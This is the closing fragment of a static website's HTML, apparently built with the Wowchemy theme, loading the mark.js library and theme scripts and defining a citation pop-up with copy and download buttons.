<script src=https://cdn.jsdelivr.net/gh/julmot/mark.js@8.11.1/dist/jquery.mark.min.js integrity="sha512-mhbv5DqBMgrWL+32MmsDOt/OAvqr/cHimk6B8y/bx/xS88MVkYGPiVv2ixKVrkywF2qHplNRUvFsAHUdxZ3Krg==" crossorigin=anonymous></script>
<script id=page-data type=application/json>{"use_headroom":true}</script><script src=/js/wowchemy-headroom.db4755770454eb63685f8de785c0a172.js type=module></script>
<script src=/en/js/wowchemy.min.e8ee06ba8371980ffde659871dd593b0.js></script><div id=modal class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><h5 class=modal-title>Cite</h5><button type=button class=close data-dismiss=modal aria-label=Close>
<span aria-hidden=true>&#215;</span></button></div><div class=modal-body><pre><code></code></pre></div><div class=modal-footer><a class="btn btn-outline-primary my-1 js-copy-cite" href=# target=_blank><i class="fas fa-copy"></i> Copy</a>
<a class="btn btn-outline-primary my-1 js-download-cite" href=# target=_blank><i class="fas fa-download"></i> Download</a><div id=modal-error></div></div></div></div></div><script src=/js/wowchemy-publication.68f8d7090562ca65fc6d3cb3f8f2d2cb.js type=module></script></body></html>